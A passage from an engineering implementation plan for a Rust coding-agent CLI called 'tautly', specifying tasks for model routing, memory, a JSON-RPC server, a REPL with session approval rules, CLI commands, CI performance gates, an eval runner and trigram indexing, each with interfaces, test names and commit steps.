**Task 25 review note (binding):** side usage is priced with the side model's catalog price and recorded in the ledger under the side model's id, never the main model's. An unpriced side model gives `cost_usd = None`, and the Task 25 warn-and-enforce-tokens rule applies. Test: `side_usage_priced_and_recorded_with_side_model_id`.

**Files:**
- Create: `crates/tautly-core/src/routing.rs`; modify `crates/tautly-provider/src/{lib.rs,catalog.rs}` (add `trait SideModel` and `tier`), `crates/tautly-provider/catalog/models.toml`, `crates/tautly-tools/src/web_fetch.rs`, `crates/tautly-core/src/{engine.rs,turn.rs}`
- Test: `crates/tautly-core/tests/routing.rs`

**Interfaces:**
- Consumes: `Config.routing` (Task 23), `compaction_request` (Task 20), `Ledger` and `Budget` (Task 25).
- Produces: `enum Tier { Small, Large }` and `ModelInfo.tier: Option<Tier>`; `#[async_trait] trait SideModel: Send + Sync { async fn complete(&self, system: &str, user: &str, max_tokens: u32) -> Result<String, ProviderError>; }` (in `tautly-provider`); `fn routing::side_model_id(cfg: &Config, catalog: &Catalog) -> ModelId`; `struct SideRunner { provider: Arc<dyn Provider>, model: ModelId, usage: mpsc::Sender<Usage> }` implementing `SideModel` and reporting `Usage{role: Side}`; `ToolCx` gains `side: Option<Arc<dyn SideModel>>`; `web_fetch` arg `question: Option<String>`.

- [ ] **Step 1: Write the failing tests:** `default_side_model_is_small_tier_of_same_provider`; `falls_back_to_main_model_when_no_small_tier`; `config_side_model_overrides_default`; `compaction_summary_requested_from_side_model_not_main` (two `MockProvider`s; inspect `requests()`); `side_usage_has_role_side_and_counts_toward_budget_and_ledger`; `web_fetch_with_question_returns_answer_and_url_capped_at_1000_tokens`; `web_fetch_without_question_unchanged`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test routing` — Expected: FAIL.
- [ ] **Step 3: Implement.** Mark Haiku-class, `-mini`, and Flash-class catalog entries `tier = "small"`. Side requests carry no tools and no reasoning.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): side-model routing for compaction, memory and web_fetch"`

### Task 28: Memory in the engine

**Obsidian-compatibility amendment (binding, user-approved 2026-11-03; spec 7.4):** this task also changes tautly-memory: real YAML frontmatter readable as Obsidian properties (pick a maintained YAML crate allowed by the global constraints; reading stays tolerant of the old `key: <JSON>` form), `tags: Vec<String>` on entries and drafts, readable file names `<title-slug>.md` with numeric collision suffixes (id stays in frontmatter; existing `<slug>-<hex>.md` files keep loading), `[[title]]`/`[[title|label]]` links parsed from bodies into `MemoryEntry.links`, `recall` adding directly linked entries within the 2,000-token cap, and memory caps/sanitizing unchanged. Tests: `vault_files_parse_as_obsidian_properties` (golden frontmatter), `wikilinks_are_followed_one_hop_by_recall`, `renamed_file_keeps_links_by_id`, `old_format_still_loads`.

**Task 24 re-review note (binding):** emit `MemoryProposed` through the turn's bound event sink (which waits on a full channel), never the actor's best-effort sink, so an interactive client never misses a proposal.

**Task 22 note (binding):** call `MemoryStore::refresh_staleness()` once the index is ready and before building the first memory index block (the engine awaits it for ~300 ms before the first `assemble`; on timeout the slot stays empty for the session); route `ContextOp::Remember` to the approval flow only when the `remember` result is not an error. Surface `MemoryStore::skipped_count()` and `staleness_error()` to the user (status line or warning event) at session start.

**Task 19 review note (binding):** the memory index lives in the cached system prefix, so `[stale]` flags and index content change only at session start, inside a cache epoch chosen by the scheduler (spec 7.7), when `decide` returns `ColdCache`, or when a new user turn starts with a cold cache; never while the cache is warm. `MemoryStore::refresh_staleness` and `apply` change engine-visible state (also called by `RecallTool` and `ApproveMemory`), so their results are held as pending text and never rendered into `Context` directly.

**Checkpoint 2 amendments (binding):** Refresh memory staleness after bash only once the index is fresh (`!is_stale()`); use `wait_ready(timeout)`.

**Files:**
- Create: `crates/tautly-core/src/memory.rs`; modify `engine.rs`, `turn.rs`, `resume.rs`
- Test: `crates/tautly-core/tests/memory.rs`

**Interfaces:**
- Consumes: `MemoryStore`, `MemoryChange`, `ContextOp::Remember` (Task 22); `SideModel` (Task 27); `Context.memory_index` (Task 19).
- Produces: engine behavior only — `MemoryProposed{proposal_id, change}` emitted for each `Remember` op and each consolidation change; `ApproveMemory` applies, `RejectMemory` discards; `ConsolidateMemory` asks the side model via `consolidation_request` and emits one proposal per parsed change; episodes written via the side model at `Shutdown`/session end and after each compaction; `refresh_staleness` at build and after every step that applied an `Edited` effect (and on `ApproveMemory` applies) updates the store only; the engine keeps a pending memory-index text (`index_block(500, …)`) and renders it into `Context.memory_index` only when (a) a GC/compaction epoch is applied, (b) the cache is cold (`decide` → `ColdCache`), or (c) a new user turn starts with a cold cache, logging each rendering as `MemoryIndexApplied{text}`; `recall` reports freshly stale hits in its output only (`[STALE…]`) and never changes the prefix; when `index_block` reports over budget, `ContextStatus.warnings` gains `memory index over budget — run /memory consolidate`. Session records gain `MemoryProposal { id, change }` and `MemoryDecision { id, approved }` so pending proposals survive resume.

- [ ] **Step 1: Write the failing tests:** `memory_index_rendered_after_agents_md_in_stable_block`; `remember_emits_proposal_and_writes_file_only_after_approve`; `reject_writes_nothing`; `stale_flag_appears_at_next_cache_epoch` (edit an anchored symbol: the next request's `memory_index` is unchanged while the cache is warm and shows `[stale]` after an epoch or a cold cache); `episode_written_by_side_model_at_shutdown`; `episode_written_after_compaction`; `over_budget_index_adds_warning`; `consolidate_emits_proposals_and_applies_only_approved`; `pending_proposal_survives_resume`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test memory` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): memory proposals, staleness, episodes, consolidation"`

### Task 29: JSON-RPC server and `tautly -p` one-shot

**Task 23 note (binding):** protocol enums have `Unknown` catch-all variants for forward compatibility; match them with a wildcard arm, and map `FinishReason::Unknown` to exit code 1.

**v1 scope note (binding, user-approved 2026-11-03; spec 3.3, 7.11):**
- Tasks 42, 43 and 47 run before this task, so the method list also includes `set_model`, `diff` and `undo`.
- `approve`'s optional `session_rule` param is added by Task 30, together with its engine handling.
- `methods_map_to_commands` covers them.
- `--approve-mcp` is added by Task 45; first-run detection and its stderr line by Task 40.

**Client-protocol amendment (binding, user-approved 2026-11-03; spec 3.4):** `initialize` accepts `client: {interactive, name, version}`; interactive clients get `ToolApprovalRequested{request_id}` / `MemoryProposed` answered by `approve`/`deny`/`approve_memory`/`reject_memory` with ids, and pending requests resolve to deny on disconnect or `shutdown`. Add `session/new {root, resume?, fork?}`, `session/list`, `session/close`; session-scoped methods take `session_id`; `event` notifications carry `session_id`. Sessions on one root share a `Workspace` hub (index, watcher, memory store; `Arc`, opened once, closed with the last session). Tests: `interactive_ask_waits_for_client_approval`, `pending_approval_denied_on_disconnect`, `two_sessions_share_one_index_and_route_events_by_session_id`, `single_session_form_still_works`.

**Files:**
- Create: `crates/tautly-rpc/src/{lib.rs,jsonrpc.rs,server.rs,oneshot.rs}`, `crates/tautly-cli/src/main.rs` (clap skeleton: `tautly [-p PROMPT] [--output json|text] [--approve auto-edit|yolo] [--model ID] [--budget-usd N] [--approve-memory] [--continue] [--resume ID] [--rpc]`; `--budget-usd` sends `SetBudget{scope: session}` before the first message)
- Test: `crates/tautly-rpc/tests/{server.rs,oneshot.rs}`, golden files under `crates/tautly-rpc/tests/snapshots/`

**Interfaces:**
- Consumes: `Engine`, `Event`, `Command`, `PROTOCOL_VERSION`.
- Produces: `async fn serve(engine: Engine, events: mpsc::Receiver<Event>, stdin: impl AsyncBufRead, stdout: impl AsyncWrite) -> Result<()>`; methods `initialize` (returns `{protocol: "1.0", session_id}`; rejects major ≠ 1), `send_message`, `approve`, `deny`, `cancel`, `set_budget`, `compact`, `uncompact`, `pin`, `unpin`, `approve_memory`, `reject_memory`, `consolidate_memory`, `fork`, `shutdown`; notifications `event` with the serialized `Event`. `async fn run_oneshot(engine, events, prompt: String, output: OutputFormat, out: impl AsyncWrite) -> i32` (exit code).

- [ ] **Step 1: Write the failing tests:** `initialize_negotiates_version`; `rejects_major_version_mismatch`; `methods_map_to_commands`; `events_become_notifications_ndjson` (each line valid JSON-RPC); `oneshot_json_golden` (insta snapshot of full event stream for a scripted mock run); `oneshot_text_prints_text_only`; `exit_codes` (completed 0, error 1, budget 2, max_turns 2, timeout 2, cancelled 130); `headless_ask_becomes_deny_without_approve_flag`; `headless_with_approve_auto_edit_allows_edits`; `headless_memory_proposal_rejected_without_flag_and_written_with_approve_memory`; `malformed_json_line_returns_parse_error_and_continues`.
- [ ] **Step 2: Run** `cargo test -p tautly-rpc` — Expected: FAIL.
- [ ] **Step 3: Implement.** Provider selection in `tautly-cli` from `model` prefix (`anthropic/`, `openai/`, `google/`, `compat:<name>/`). Hidden test flag `--mock-script <file>` (cfg feature `mock`) wires `MockProvider` for golden and perf tests.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(rpc): JSON-RPC server and tautly -p one-shot mode"`

### Task 30: Daily-driver REPL (rewritten, user-approved 2026-11-03; spec 7.11.8; execute after Task 45)

**Checkpoint 3 note (binding):** the sandbox root is the git top level when the start directory is inside a git work tree (else the start directory); the REPL and `tautly -p` build the engine with that root, and an ancestor `AGENTS.md` above it follows spec 6.1's confinement rule (its link target must stay inside the directory holding it).

**Scope note (binding):** this replaces the earlier y/n stub. It consumes events added by Tasks 39 (`TurnReceipt`), 42 (`diff`, `SessionDiff`), 43 (`ModelChanged`), 44 (`TurnFinished.evidence`), 45 (`McpServerApprovalRequested`, `McpServerStatus`) and 47 (`Undone`), all of which run first. The engine half of "allow for this session" (session rules) is built here, because the REPL is its first user; Task 46 reuses it for ACP `allow_always`. Ctrl+C semantics come from Task 25 (first cancels the turn and kills child groups within 200 ms). The full-screen TUI stays sub-project 3.

**Files:**
- Create: `crates/tautly-tui/src/{lib.rs,repl.rs,render.rs,input.rs,approve.rs,slash.rs}`
- Modify:
  - `crates/tautly-cli/src/main.rs`: no `-p`, no `--rpc`, no `acp` subcommand and stdin is a TTY → REPL.
  - `crates/tautly-core/src/{protocol.rs,approvals.rs,engine.rs}` and `crates/tautly-sandbox/src/policy.rs`: session rules.
  - `crates/tautly-rpc/src/server.rs`: `approve` passes an optional `session_rule` param.
- Test: `crates/tautly-tui/tests/repl.rs`, `crates/tautly-core/tests/session_rules.rs`, `crates/tautly-rpc/tests/server.rs` (`approve_with_session_rule`)

**Interfaces:**
- Consumes:
  - `Engine`, `Event`, `Command` with the variants above.
  - `EngineBuilder.resume`.
  - `tautly sessions list` data (Task 31: `fn sessions::list(project: &Path, limit: usize) -> Vec<SessionSummary>`).
  - `Ledger::session_receipts` (Task 39).
- Produces:
  - `Command::Approve { request_id: String, #[serde(default)] session_rule: Option<String> }`
  - `fn Policy::add_session_allow(&mut self, rule: &str) -> Result<(), PolicyError>`. Session rules are checked with the config allow rules, after deny rules, protected paths and unparseable commands. They are held in memory only.
  - `fn Policy::rule_matches(rule: &str, tool: &str, effect: &Effect, raw_cmd: Option<&str>) -> Result<bool, PolicyError>`.
  - `fn approve::exact_rule(tool: &str, args: &Value) -> Option<String>`:
    - `edit(<path>)`, `write(<path>)`
    - `bash(<whitespace-collapsed command, glob metacharacters escaped>)`
    - `web_fetch(<host>)`
    - `mcp__<server>__<tool>`
  - `#[async_trait] trait LineSource { async fn read_line(&mut self, prompt: &str) -> Result<Line, ReplError>; }` with `enum Line { Text(String), CtrlC, CtrlD }`. `ReedlineSource` (history file `<data home>/repl_history`, 1,000 entries, multi-line via Alt+Enter and bracketed paste) and `ScriptedSource` (tests).
  - `struct ReplOptions { color: bool /* TTY && NO_COLOR unset */, footer: bool /* [receipts] footer */, history: Option<PathBuf> }`.
  - `type EngineFactory = Box<dyn Fn(Option<String> /* resume */) -> Result<(Engine, mpsc::Receiver<Event>), EngineError> + Send + Sync>`.
  - `async fn run_repl(factory: EngineFactory, input: impl LineSource, out: impl AsyncWrite + Unpin, signals: impl Stream<Item = ()> /* SIGINT */, opts: ReplOptions) -> Result<(), ReplError>`.
  - `fn render::event(e: &Event, st: &mut RenderState, opts: &ReplOptions) -> Option<String>`.
  - `fn slash::parse(line: &str) -> Option<Slash>`, `enum Slash { Model(Option<String>), Cost, Diff(Option<u32>), Undo(Option<u32>), Resume(Option<String>), Compact, Pin(String), Unpin(String), Fork, MemoryConsolidate, Help, Unknown(String) }`.

- [ ] **Step 1: Write the failing tests.**
  - REPL tests (scripted input, captured output):
    - `prints_streamed_text`;
    - `reasoning_shows_one_thinking_line_per_step`;
    - `tool_row_format`: `ok bash cargo test -p x 2.1s · exit 0`; target truncated to 60 columns; statuses `ok|err|denied|blocked|cancelled`; `+a -r` for edits; filter saving note;
    - `coloured_diff_only_with_color_option`: ANSI codes present with `color: true`, absent otherwise;
    - `footer_after_each_turn`, matching `turn \d+ · \d+ steps · [\d.]+s · ctx \d+/\d+ tok · cache \d+% · \$\d+\.\d{4} \(session \$\d+\.\d{4}\) · saved ~\S+ tok \(est\.\)`;
    - `footer_hidden_when_option_off`;
    - `evidence_line_fresh_stale_and_none`: `last test: cargo test · exit 0 · fresh`, `stale (2 edits since)`, and `no test run this turn` when the turn edited without testing;
    - `approval_prompt_shows_diff_and_y_approves_n_denies`;
    - `approval_a_sends_exact_session_rule`: `Approve{session_rule: Some("bash(cargo test -p x)")}`;
    - `approval_a_with_pattern_sends_user_rule`: `a bash(cargo test*)`;
    - `slash_commands_map`:
      - `/model x` → `SetModel`; `/diff 2` → `Diff{turn: Some(2)}`; `/diff` → `Diff{turn: None}`;
      - `/undo` → `Undo{turn: None, dry_run: true}`, then `y` → `Undo{turn: None, dry_run: false}`, while `n` sends nothing;
      - `/compact`, `/pin a`, `/unpin a`, `/fork`, `/memory consolidate` → their commands;
    - `model_without_arg_lists_current_and_models_with_keys`;
    - `cost_prints_turn_and_session_receipt`;
    - `resume_without_arg_lists_last_10_sessions_and_with_arg_rebuilds_engine`: the factory is called with `Some(id)`;
    - `memory_proposal_and_mcp_server_approval_use_y_n`;
    - `ctrl_c_once_cancels_twice_within_2s_exits`: the injected signal stream; a third Ctrl+C after 2 s cancels again instead of exiting;
    - `ctrl_c_at_prompt_clears_line_ctrl_d_exits`;
    - `history_written_without_approval_answers`;
    - `unknown_slash_command_prints_help`.
  - Core `session_rules` tests:
    - `session_rule_allows_matching_call`: the second identical `bash` call emits no `ToolApprovalRequested`;
    - `session_rule_not_persisted_and_gone_after_resume`;
    - `deny_rule_beats_session_rule`;
    - `protected_path_still_asks_with_session_rule`: `edit(Cargo.toml)` asks again;
    - `non_matching_session_rule_approves_once_and_warns`.
- [ ] **Step 2: Run** `cargo test -p tautly-tui && cargo test -p tautly-core --test session_rules` — Expected: FAIL.
- [ ] **Step 3: Implement.**
  - Plain line output, no alternate screen.
  - Rendering is a pure function of events plus `RenderState` (tests never need a terminal).
  - The engine validates `session_rule` with `Policy::rule_matches` against the pending call before `add_session_allow`.
  - `/resume` drops the current engine (`Shutdown`) before building the new one.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tui): daily-driver line REPL with session rules"`

### Task 31: CLI utility commands

**Checkpoint 4 note (binding):** this task owns the CLI parts deferred from Tasks 45 and 47: `tautly mcp list` (via `plan_servers` + `McpHub` status), `tautly mcp import [--from PATH]` (via `parse_mcp_json` + `import_into_toml`, comments preserved), `tautly undo [--turn N] [--dry-run]` (via `undo::undo` with the session's checkpointer and excludes store) and `tautly sessions delete <id>` (via `sessions::delete`, also pruning checkpoint refs and the excludes store). `--approve-mcp` and `--no-checkpoints` already exist (Task 29). Tests from the Task 45 report's CLI checklist and Task 47's brief.

**v1 scope note (binding, user-approved 2026-11-03):**
- Expose `fn sessions::list(project: &Path, limit: usize) -> Vec<SessionSummary>`, with `struct SessionSummary { id: String, started: SystemTime, first_prompt: String /* first line, ≤ 60 chars */, cost_usd: Option<f64> }`, for the REPL's `/resume` (Task 30).
- `tautly undo` switches to user-turn numbering and gains checkpoint restores in Task 47; `tautly sessions delete` is added there too.

**Files:**
- Create: `crates/tautly-cli/src/cmd/{prompt.rs,sessions.rs,models.rs,undo.rs}`
- Test: `crates/tautly-cli/tests/cli.rs` (`assert_cmd`)

**Interfaces:**
- Produces: `tautly prompt show [--full]` (system prompt; `--full` prints last request of latest session as JSON); `tautly sessions list|show <id>|export <id> [--format jsonl|md]`; `tautly models list|update [--from URL]` (default URL `https://models.dev/api.json`, writes `~/.config/tautly/models.toml` overrides); `tautly undo [--turn N]`; `tautly memory list|show <id>|consolidate` (consolidate runs a headless engine turn that issues `ConsolidateMemory` and prompts y/n per proposal); `tautly index status|rebuild`.

- [ ] **Step 1: Write the failing tests:** `prompt_show_prints_system_prompt`; `prompt_show_full_prints_last_request`; `sessions_list_shows_ids`; `sessions_export_md`; `models_update_from_local_fixture_server` (wiremock); `undo_restores_file` (run mock session that edits a file, then `tautly undo`); `memory_list_shows_stale_marker`; `index_status_reports_file_and_symbol_counts`.
- [ ] **Step 2: Run** `cargo test -p tautly` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(cli): prompt, sessions, models, undo commands"`

### Task 32: Opt-in OpenTelemetry export — Removed from v1 (user-approved 2026-11-03) — post-v1

**Do not execute in v1.** The text below is kept for the post-v1 roadmap. In v1, the `[telemetry]` table stays reserved: it is parsed and ignored, and `enabled = true` produces a `Warning` (Task 40). No `otel` feature or opentelemetry dependency is added.


**Files:**
- Create: `crates/tautly-core/src/telemetry.rs`
- Test: `crates/tautly-core/tests/telemetry.rs`

**Interfaces:**
- Produces: `fn telemetry::init(cfg: &TelemetryConfig) -> Option<TelemetryGuard>`; spans per turn (`gen_ai.chat`) and per tool (`execute_tool`) with attributes `gen_ai.system`, `gen_ai.request.model`, `gen_ai.usage.input_tokens`, `gen_ai.usage.output_tokens`, `tautly.cost_usd`.

- [ ] **Step 1: Write the failing tests:** `disabled_by_default_no_exporter_and_no_network` (default config → `init` returns `None`); `enabled_exports_turn_and_tool_spans` (in-memory exporter, assert span names and attributes).
- [ ] **Step 2: Run** `cargo test -p tautly-core --test telemetry` — Expected: FAIL.
- [ ] **Step 3: Implement** behind cargo feature `otel` (default on in `tautly-cli` build, runtime-disabled by config).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): opt-in OpenTelemetry GenAI spans"`

### Task 33: Performance gates in CI

**Checkpoint 2 amendments (binding):** Add an RSS gate for a 100k-file tree (index open + tree) and a gate that a no-op post-bash freshness check with a live watcher is cookie-based (< 50 ms), not a full refresh.

**v1 scope note (binding, user-approved 2026-11-03):**
- Cold-start gates run with `--mock-script`, which skips provider detection (Task 40), so they measure the same path as before.
- Add the Task 47 checkpoint timings to the `perf` job: a clean 10,000-file repo < 300 ms and an unchanged-tree reuse < 5 ms, median of 20. These are recorded, and gated once stable.
- Report the per-step latency added by checkpoints in the job summary.

**Files:**
- Create: `benches/perf/startup.sh`, `benches/perf/soak.rs`, `benches/perf/big_output.rs` (as `[[test]]` targets in a `perf` crate or `tautly-cli` with `#[ignore]` run explicitly), modify `.github/workflows/ci.yml` (job `perf`, release build, both OSes)
- Test: the gates themselves

**Interfaces:**
- Consumes: `tautly --mock-script`, `MockProvider`, `Engine`.

- [ ] **Step 1: Write the gates:**
  - `startup.sh`: `hyperfine --warmup 3 --export-json out.json 'tautly --version' 'tautly -p hi --mock-script benches/perf/hello.json --output json'`; fail if mean > 0.050 s for either.
  - Idle RSS: start `tautly --rpc --mock-script …`, send `initialize`, sleep 2 s, read RSS (`ps -o rss=`); fail if > 30 MB.
  - `soak.rs`: drive `Engine` with a looping mock (text + read/grep/edit tool calls) under `tokio::time::pause`, simulating 4 h of turns with compaction; sample RSS (`memory-stats` crate) at the 10-minute mark and every simulated 10 min; fail if any sample is outside ±10% of the 10-minute sample.
  - `big_output.rs`: bash tool emitting 100 MB (`head -c 100000000 /dev/zero | tr '\0' a`); assert peak RSS growth < 20 MB and spill file size == 100,000,000.
  - Workspace: on a generated 100,000-file repo, selective `grep` via trigram candidates < 50 ms and tree `glob` < 5 ms (median of 20).
  - Index: generate a 10,000-file synthetic Rust/TS/Python repo (`benches/perf/gen_repo.rs`, fixed seed); assert `Index::refresh` from empty < 10 s and `reindex_file` on a 500-line file < 50 ms (median of 20).
  - Context: measure `splits_tool_pair` (compaction cut search) at a few thousand step-turns (e.g. 2,000 and 5,000) and record the numbers; add a gate if growth is quadratic.
  - Index: run `top_referenced` on a read-only WAL connection (or from incrementally maintained per-name counts) so it never blocks the writer; on the 20k-file repo assert a `reindex_file` started during `top_referenced(20)` stays < 50 ms.
  - Binary size: print `ls -l target/release/tautly` to the job summary (not gated).
- [ ] **Step 2: Run** `cargo build --release && bash benches/perf/startup.sh && cargo test --release -p perf -- --ignored` — Expected: currently may FAIL; record numbers.
- [ ] **Step 3: Fix** any failing gate (typical levers: lazy provider/catalog init, `opt-level=3`, `lto="thin"`, `codegen-units=1`, `panic` unwinding kept, avoid tokio multi-thread runtime for `--version`).
- [ ] **Step 4: Run** the same commands — Expected: all gates PASS.
- [ ] **Step 5: Commit** `git commit -m "ci: performance gates for startup, RSS, soak, big output"`

### Task 34: `tautly eval` runner and starter task set

**Benchmark kit amendment (binding, user-approved 2026-11-03; spec 9.3):**
- `tautly eval` gains `--trials N` (default 1). Results keep one entry per task and trial, and `summary` gains `trials` and the per-metric `mean`/`stdev` across trials.
- `tautly eval report <results.json>... [--markdown]` prints the comparison table: model, pass rate, tokens per solved task, cache hit ratio, cost.
- Add `benchmarks/tokens/run.sh` (fixed models and trials, writes raw JSON under `benchmarks/tokens/results/<date>/`) and a committed fixture `benchmarks/tokens/fixtures/sample.json`.
- Tests:
  - `trials_aggregate_mean_and_stdev`;
  - `report_markdown_golden` (insta, run on the fixture);
  - the CI `perf` job runs `tautly eval report benchmarks/tokens/fixtures/sample.json --markdown`.
- No live run in CI.

**Files:**
- Create: `crates/tautly-cli/src/cmd/eval.rs`, `evals/starter/<id>/{task.toml,setup.sh,verify.sh}` × 50, `evals/README.md` (task format)
- Test: `crates/tautly-cli/tests/eval.rs`

**Interfaces:**
- Produces: `tautly eval --tasks <dir> --model <id> [--edit-format str_replace|patch|hashline] [--jobs N] [--out results.json]`; `task.toml` = `{ id, prompt, timeout_s = 600, budget_usd = 1.0, tags = [] }`; results JSON `{ model, edit_format, tasks: [{ id, passed, cost_usd, tokens_in, tokens_out, cache_read, side_tokens, edit_failures, duration_s }], summary: { pass_rate, total_cost_usd, edit_failure_rate, tokens_per_solved_task, cache_hit_ratio, blocked_attempts, edit_repairs_by_stage } }` with `tokens_per_solved_task = Σ(tokens_in + tokens_out + side_tokens) / solved` and `cache_hit_ratio = Σcache_read / Σ(tokens_in + cache_read)`. `tautly eval --replay evals/replay` runs scripted `MockProvider` sessions (deterministic) and compares `tokens_per_solved_task` with `evals/baseline.json`; exits non-zero if it exceeds baseline by > 10%; `--update-baseline` rewrites it. `edit_failures` = count of `edit` ToolResults with `is_error` in the session log.

- [ ] **Step 1: Write the failing tests:** `runs_task_in_temp_git_worktree_and_cleans_up`; `verify_exit_0_is_pass`; `respects_task_budget` (mock exceeding budget → passed=false, reason budget); `edit_format_override_applied` (provider request tool schema matches format); `summary_math` (including tokens per solved task and cache hit ratio); `replay_regression_over_10_percent_fails`; `replay_within_10_percent_passes`.
- [ ] **Step 2: Run** `cargo test -p tautly --test eval` — Expected: FAIL.
- [ ] **Step 3: Implement** the runner (spawns `tautly -p … --approve yolo --output json` per task in a fresh worktree; parses event stream). Author 50 starter tasks: 15 bug fixes, 10 small features, 10 refactors/renames, 5 multi-file edits, 5 test-writing, 5 config/build fixes; spread across Rust, Python, TypeScript, Go; each `setup.sh` creates a tiny repo, each `verify.sh` runs its tests. Validate every task: `verify.sh` fails on the unmodified setup. Record a replay script for 10 of the tasks (mock responses that exercise read, re-read, outline/symbol, edit, bash test runs and recall) and commit the initial baseline. Add the replay gate to the CI `perf` job.
- [ ] **Step 4: Run** `cargo test -p tautly --test eval && for d in evals/starter/*/; do (cd $(mktemp -d) && bash "$OLDPWD/$d/setup.sh" && ! bash "$OLDPWD/$d/verify.sh"); done` — Expected: PASS, and every task fails before solving.
- [ ] **Step 5: Commit** `git commit -m "feat(eval): tautly eval runner and 50-task starter set"`

### Task 35: Live smoke suite and daily-driver acceptance

**Benchmark kit and acceptance amendment (binding, user-approved 2026-11-03; spec 9.3, 7.11):**
- **Terminal-Bench adapter.** Add `benchmarks/terminal-bench/`:
  - an installed-agent adapter for the Terminal-Bench 2.0 harness (harness version pinned in its README). It installs the release binary in the task container and runs `tautly -p "<instruction>" --approve yolo --output json`, keeping the event stream for token counts;
  - `run.sh` for N trials (default 5) with a fixed model.
- **Docs and CI.** Add `docs/benchmark.md`: methodology, reproduce commands, known failures, how to compare harnesses on the same model. CI runs `shellcheck` on the kit's scripts only; there is no live run in CI.
- **Acceptance (Step 3) also records:**
  - a zero-config first run on a clean account (no config file, only an env key): first answer, then `tautly doctor` exit 0;
  - one task driven from Zed through `tautly acp`;
  - `/undo` reverting a `bash` change in a git repo;
  - one real MCP server (stdio) used through a tool call.

**Files:**
- Create: `crates/tautly-cli/tests/live_smoke.rs` (`#[ignore]`, requires keys), `.github/workflows/nightly.yml`
- Test: itself

- [ ] **Step 1: Write the tests:** for each of `anthropic/claude-sonnet-5-5`, `openai/gpt-5`, `google/gemini-3-pro`, `compat:ollama/<small model>` (skipped if no server): in a temp repo containing a failing unit test, run `tautly -p "make the failing test pass" --approve auto-edit --output json` with `--budget-usd 0.50`; assert exit 0 and the repo's test passes.
  - Reasoning continuity (per provider with reasoning support): run a three-step tool loop with reasoning on and compare `reasoning_tokens`/`cache_read` with and without the working-state tail (or ask the model to quote its step-1 reasoning). If continuity is lost, switch that adapter to place the state inside the last tool result's content (Anthropic `tool_result` content blocks, OpenAI `function_call_output.output`, Gemini `functionResponse.response`) using the `CanonicalRequest.volatile_tail` marker, with the last breakpoint on the block before it. Also verify live OpenAI accepts reasoning items next to id-less items.
- [ ] **Step 2: Run** `cargo test -p tautly --test live_smoke -- --ignored` locally with keys — Expected: PASS for each configured provider.
- [ ] **Step 3: Acceptance (manual, recorded in `docs/acceptance/2026-xx-daily-driver.md`):** use `tautly` REPL for one real task per adapter on a real repository; note any failure as a new issue.
- [ ] **Step 4: Run** full suite `cargo test --workspace && cargo clippy --workspace -- -D warnings` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "test: nightly live smoke suite across four adapters"`

### Task 36: Live workspace tree and trigram index (execute after Task 15)

**Files:**
- Create: `crates/tautly-index/src/{tree.rs,watch.rs,trigram.rs}`; modify `lib.rs`, `store.rs`, `update.rs`
- Test: `crates/tautly-index/tests/{tree.rs,trigram.rs}`

**Interfaces:**
- Consumes: `Index`, `Sandbox::walker` (Tasks 1, 14).
- Produces:
  - `struct FileEntry { path: PathBuf, size: u64, mtime: SystemTime, hash: String }`
  - `Index::tree(&self) -> TreeView` with `fn glob(&self, pattern: &str, base: &Path) -> Vec<PathBuf>` (sorted, literal_separator semantics like the glob tool), `fn list_dir(&self, dir: &Path) -> Vec<FileEntry>`, `fn len(&self) -> usize`
  - `Index::start_watcher(self: Arc<Self>) -> Result<WatchHandle, IndexError>` (`notify`, 50 ms debounce; changed files → `reindex_file`, removed → delete rows; dropping the handle stops it)
  - `Index::grep_candidates(&self, pattern: &str) -> Candidates` with `enum Candidates { Files(Vec<PathBuf>), FullScan }` (`regex-syntax` literal extraction; any literal < 3 bytes, parse error, or index not ready → FullScan)
  - Trigram rows maintained by `refresh` and `reindex_file` in table `trigrams(tri INTEGER, file_id INTEGER, PRIMARY KEY(tri, file_id)) WITHOUT ROWID`

- [ ] **Step 1: Write the failing tests:** `tree_loads_from_db_and_matches_disk`; `tree_glob_matches_glob_tool_semantics` (`src/*.rs` excludes `src/a/b.rs`); `edit_via_reindex_updates_tree_synchronously`; `watcher_picks_up_external_create_modify_delete_within_1s`; `watcher_ignores_gitignored_paths`; `grep_candidates_narrows_to_files_containing_literal`; `grep_candidates_alternation_unions_postings` (`foo|barbaz` → files with foo ∪ files with barbaz); `short_literal_or_complex_pattern_falls_back_to_full_scan`; `candidates_never_miss_a_true_match` (proptest: random files + random literal patterns; every file the full scan matches is in Candidates or FullScan is returned); `binary_and_oversize_files_have_no_trigrams`.
- [ ] **Step 2: Run** `cargo test -p tautly-index --test tree --test trigram` — Expected: FAIL.
- [ ] **Step 3: Implement.** Trigrams are over raw bytes, lowercased ASCII for a case-insensitive flag, deduplicated per file; batch inserts in the existing per-500-files transaction.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(index): live workspace tree, file watcher, trigram index"`

### Task 37: `find` tool, batched reads, index-backed grep/glob (execute after Task 36)

**Files:**
- Create: `crates/tautly-tools/src/find.rs`; modify `read.rs`, `grep.rs`, `glob.rs`, `lib.rs` (registry)
- Test: `crates/tautly-tools/tests/{find.rs,batched_read.rs}`; extend `read_side.rs`

**Interfaces:**
- Consumes: `Index::{tree, grep_candidates, find_symbol}` (Tasks 14, 36), `ToolCx.index`.
- Produces: `FindTool` (`Effect::ReadOnly`, args `{query, kind?: "symbol"|"path"|"text", limit?: 1..=50 default 20}`); registry order becomes `read, edit, write, bash, grep, glob, find, outline, symbol, refs, …` (insert `find` after `glob`; later tasks keep their relative order); `read` args gain `targets: [{path, start_line?, end_line?} | {symbol, kind?}]` (≤ 10; mutually exclusive with `path`).

